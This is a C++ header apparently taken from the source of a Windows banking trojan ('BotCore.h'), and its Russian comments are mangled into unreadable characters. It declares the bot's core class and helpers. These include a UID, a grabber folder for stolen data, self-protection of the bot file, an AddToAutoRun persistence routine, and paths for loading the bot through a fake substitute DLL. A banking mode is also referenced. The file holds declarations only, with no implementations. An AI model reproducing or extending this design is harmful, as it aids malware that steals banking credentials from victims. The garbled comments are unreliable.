//---------------------------------------------------------------------------
//  �������� ������ ����, ������������ � ���� ������� ������
//---------------------------------------------------------------------------

#ifndef BotCoreH
#define BotCoreH
//---------------------------------------------------------------------------

// ���������� ������ ��� ������ � WINAPI � ����
#include "GetApi.h"

// ������ ��� ������ � �������
#include "Memory.h"

// ������ ��� ������ �� ��������
#include "Strings.h"

// ������ ����������
#include "Crypt.h"

// ������� ��������� ����
#include "Config.h"


// ������ ������� ������
#include "Utils.h"

// ������ ��� ������ � HTTP
#include "BotHTTP.h"


//*****************************************************************************
//  ���� ������ �� ���������� � ����� ����������
//  ���� ������ ������������� ������ ������
//  ������ ���������� � ���� ��� �������������� ������
//  �������� ���������� ����
//  ��-�� ���� �� ����������� ������������� ��������������
//  ������� ������ �� ����� ������ �������� ���� ������
//*****************************************************************************
#include "Modules.h"







//***********************************************************
//  TBotApplication - ����� �������������� ������� �
//                    �������� �������� ����
//***********************************************************
class TBotApplication : public TBotObject
{
private:
	bool   FTerminated;
	DWORD  FPID;
    string FUID;
	string FApplicationName;
	string FPerfixFileName;
	string FWorkPath;
	string FGrabberPath;

	string MakeWorkPath(bool SystemPath);
	PCHAR  GetWorkFolder(); // ������� ���������� ��� ������� ����� ����
public:
	TBotApplication();
	~TBotApplication();

	DWORD  PID();
	string UID();


	string ApplicationName(); // ��� ���������� � ������� �������� ���
	string PrefixFileName();  // ������� ���������� ��� ����� ��� �������� ��������
	string WorkPath();        // ���� � �������� �������� ����
	string GrabberPath();     // ���� � �������� �������� ������� ������

	string MakePath(const char* SubDirectory);   // ������� �������� ���� � ��������� ��������������
	string MakePath(const string &SubDirectory);

	string CreateFile(const char* SubDir, const char* FileName);    // ������� ������ ���� � ������� �������� ����
	string CreateFile(const string &SubDir, const char* FileName);

	string MakeFileName(const char* SubDir, const char* FileName);  // ������� �������� ��� ����� � ������� ����� ����
	string MakeFileName(const string &SubDir, const char* FileName);

	bool   FileExists(const char* SubDir, const char* FileName);    // ������� ��������� ������� ����� � ������� ����� ����
	bool   FileExists(const string &SubDir, const char* FileName);

	void   SaveSettings();    // ������� ��������� ������� ���������
	void   DeleteSettings();  // ������� ������� ����� ����������� ���������
	bool   Terminated();
};




//*****************************************************************************
//  Bot - ������ ��� ����������� ������ ���� ����
//*****************************************************************************
namespace BOT
{
	//----------------------------------------------------
	//  Initialize - ������� �������������� ����������
	//				 ��������� ����
	//----------------------------------------------------
    void Initialize();

	//�������������� ������ ������� ������ ������� API, ����� ��� ������� �� ��� �������
	//Initialize() �� �������� ��� ������ �� ��� �������, ������ �� ���������� ������ Bot = new TBotApplication();, ����� �������� ������
	void InitializeApi();

	//----------------------------------------------------
	// ������� ���������� ������� ������� ����
	//
	// SubDir - ����������, ������� ����� �������� �
	//          ����������� ����������.
	//          �� ������ ���������� �� �����, �� ������
	//			�� �������������
	//
	// FileName - ��� �����, ������� ����� ��������� �
	//			  ����������� ��������
	//----------------------------------------------------
	PCHAR GetWorkPath(PCHAR SubDir = NULL, PCHAR FileName = NULL);

	//----------------------------------------------------
	//  GetWorkPathInSysDrive - ������ ������� GetWorkPath.
	//  	������� �� ����� �� ��� � ���, ��� �����
	//      �������� � ����� ���������� �����
	//----------------------------------------------------
	PCHAR GetWorkPathInSysDrive(PCHAR SubDir = NULL, PCHAR FileName = NULL);

	//----------------------------------------------------
	//  GetWorkFolderHash - ������� ���������� ���
	//  	                   ����� ������� �����
	//----------------------------------------------------
	DWORD GetWorkFolderHash();

	//----------------------------------------------------
	//  GetBotFileName - ������� ���������� ��� ����� ����
	//----------------------------------------------------
	PCHAR GetBotExeName();

	//----------------------------------------------------
	//  GetBotExeNameHash - ������� ���������� ��� ���
	//						����� ����
	//----------------------------------------------------
    DWORD GetBotExeNameHash();

	//----------------------------------------------------
	//  GetBotFullExeName - ������� ���������� ������ ���
	//						����� ����
	//----------------------------------------------------
	PCHAR GetBotFullExeName();

	//----------------------------------------------------
	// ������� �������� ��� ���� �� ��������
	//----------------------------------------------------
	void Protect(PCHAR FileName);

	//----------------------------------------------------
	// ������� ������� ������ � ��� ����� ����
	//----------------------------------------------------
	void Unprotect();

	//----------------------------------------------------
	// AddToAutoRun - ������� ��������� ��� � ������������
	//----------------------------------------------------
	bool AddToAutoRun(PCHAR FileName);

	//----------------------------------------------------
	//  BotExeMD5 - ������� ���������� MD5 ��� ��� ����
	//----------------------------------------------------
    string BotExeMD5();

	//----------------------------------------------------
	//  TryCreatBotInstance - ������� ���������� 
	//  ����� ��������, �� ������� �������� ��������
	//  �������� ��� ���� ��������� ������� ������.
	//----------------------------------------------------
	HANDLE TryCreateBotInstance();

	//----------------------------------------------------
	//  IsRunning - ������� ���������� ������ ���� �
	//  ������� ��� ������� ��������� ����
	//----------------------------------------------------
	bool IsRunning();

	//���������� ���������� ��� �������� ������ ��� ������� ���� Fake.dll
	extern char FakeDllPathBot[MAX_PATH]; //���� � ������������ ���� ���� (bot.plug)
	extern char FakeDllPathDll[MAX_PATH]; //���� � ����� Fake.dll, �� �������� ������������ dll
	extern char FakeDllPathOrigDll[MAX_PATH]; //���� � ������������ ���
}

//��� ����, ���������������� � ������� BOT::Initialize(), ����� �������� ���� ����� ������� ������� 
//����� ������� SetBankingMode()
extern char BOT_UID[128];



//===================================================
//    ���������� ����� ���������� ����
//===================================================

extern TBotApplication* Bot;


//---------------------------------------------------------------------------
#endif
